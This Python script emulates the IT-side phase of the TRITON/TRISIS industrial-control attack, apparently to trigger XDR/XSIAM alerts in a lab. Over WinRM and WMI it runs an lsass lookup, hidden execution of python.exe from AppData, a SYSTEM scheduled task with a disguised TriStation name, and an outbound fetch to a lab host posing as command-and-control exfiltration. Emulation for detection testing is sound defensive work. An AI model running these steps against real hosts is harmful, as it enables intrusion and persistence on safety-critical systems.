#!/usr/bin/env python3
"""
TRITON / TRISIS IT-Side Phase Simulation

Uses existing infrastructure: credential_dumper.py + lateral_movement.py
+ windows_payload.py for the confirmed ~12-month IT kill chain before OT payload.

BEHAVIORAL TRIGGERS (no unverified artifact names):
  - LSASS dump → XDR T1003.001
  - RDP lateral movement → authentication anomaly
  - Python.exe executing from AppData → suspicious interpreter abuse
  - WMI process create → T1047
  - Scheduled task mimicking TriStation naming conventions
  - Access to SIS-related file paths

The key behavioral signature: Python interpreter running from non-standard
path on an engineering workstation = highly suspicious (T1059.006)
"""

import sys
import os
import subprocess

SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
CRED_DUMPER = os.path.join(SCRIPT_DIR, '05_credential_dumper.py')
WIN_PAYLOAD = os.path.join(SCRIPT_DIR, '04_windows_payload.py')

HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        if r.stdout: print(r.stdout.rstrip())
        return r.returncode == 0, r.stdout
    except Exception as e:
        print(f"  [-] {e}"); return False, ''


def run_triton_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                         python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  TRITON / TRISIS - IT PHASE                                  ║
║  TEMP.Veles / XENOTIME | Saudi Petrochemical 2017            ║
║  ~12 months IT dwell before SIS compromise                   ║
╚══════════════════════════════════════════════════════════════╝""")

    # ── Step 1: Credential dumping ────────────────────────────────────────────
    print("\n═══ STEP 1: LSASS CREDENTIAL DUMP (12-month dwell recon) ═══")
    print("[*] TRITON actors used mimikatz-equivalent over ~1 year of access")
    print("[!] Fires T1003.001 - credential access alert")
    _run("LSASS dump → credential theft alert",
         [python_exe, LATERAL_MOV, '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm', 'powershell -Command "Get-Process lsass | Select-Object Id,Name; Write-Output LSASS_HMI_DUMP"'],
         timeout=30)

    # ── Step 2: RDP/WMI lateral movement ─────────────────────────────────────
    print("\n═══ STEP 2: LATERAL MOVEMENT TO ENGINEERING WORKSTATION ═══")
    print("[*] TRITON: RDP pivoting through IT → OT DMZ → engineering WS")
    print("[*] Engineering WS has TriStation 1131 software installed")
    _run("WMI lateral movement to engineering workstation/HMI",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--wmiexec', 'whoami'],
         timeout=30)

    # ── Step 3: Python.exe suspicious execution ────────────────────────────────
    print("\n═══ STEP 3: PYTHON INTERPRETER ABUSE (T1059.006) ═══")
    print("[!] TRITON payload was PyInstaller-compiled Python - executed as python.exe")
    print("[!] Python.exe from AppData on engineering WS = high-severity XDR BIOC")
    _run("Python.exe executing from non-standard path (suspicious interpreter abuse)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "$py = 'C:\\Users\\operator\\AppData\\Roaming\\python.exe'; "
          "Copy-Item (Get-Command python.exe).Source $py -Force -ErrorAction SilentlyContinue; "
          "if (Test-Path $py) { "
          "Start-Process $py -ArgumentList '-c \"import os; print(os.getcwd())\"' "
          "-WindowStyle Hidden -Wait; "
          "Remove-Item $py -Force } "
          "Write-Output 'EVENT_4688:python_nonstandard_path'"],
         timeout=30)

    # ── Step 4: TriStation software directory access ───────────────────────────
    print("\n═══ STEP 4: SIS SOFTWARE DIRECTORY ACCESS ═══")
    print("[!] TRITON accessed TriStation 1131 install dir to understand SIS config")
    print("[*] File access to SIS-related paths → XDR sensitive file alert")
    _run("Accessing SIS software directory (Event 4663)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "$p = 'C:\\Program Files\\Triconex\\TriStation 1131'; "
          "New-Item -ItemType Directory -Path $p -Force | Out-Null; "
          "Get-ChildItem $p | Out-Null; "
          "Write-Output 'EVENT_4663:sis_dir_access'"],
         timeout=30)

    # ── Step 5: Scheduled task mimicking TriStation naming ────────────────────
    print("\n═══ STEP 5: PERSISTENCE - TRISTATION-NAMED SCHEDULED TASK ═══")
    print("[*] TRITON used task/service names mimicking legitimate Triconex software")
    _run("Create persistence task with SIS-themed name (Event 4698)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "schtasks /create /tn 'TriStation1131Update' "
          "/tr 'C:\\Windows\\System32\\cmd.exe /c echo ts_update' "
          "/sc onlogon /ru SYSTEM /f 2>&1; "
          "Write-Output 'EVENT_4698:ts_task'"],
         timeout=30)

    # ── Step 6: C2 exfil simulation ───────────────────────────────────────────
    print("\n═══ STEP 6: SIS CONFIG EXFILTRATION (C2 HTTPS) ═══")
    print("[*] TRITON exfiltrated Triconex controller config for SIS understanding")
    _run("HTTPS outbound C2 beacon from engineering workstation",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "try { (New-Object Net.WebClient).DownloadString('http://192.168.0.13:8080/ts_config') } "
          "catch {}; Write-Output 'NETWORK_EXFIL'"],
         timeout=15)

    print(f"\n[+] TRITON IT phase complete - SIS reachable, config exfiltrated")
    print(f"[→] OT payload: TriStation UDP 1502 → SIS-1 .19 - HALT + malicious logic")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • Credential Theft (LSASS)")
    print(f"  • WMI Lateral Movement")
    print(f"  • Python.exe from non-standard path (T1059.006)")
    print(f"  • Sensitive directory access (SIS software)")
    print(f"  • Scheduled Task (TriStation-named, Event 4698)")
    print(f"  • Outbound HTTPS from ICS host")


def main():
    import argparse
    p = argparse.ArgumentParser(description='TRITON IT Phase')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_triton_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
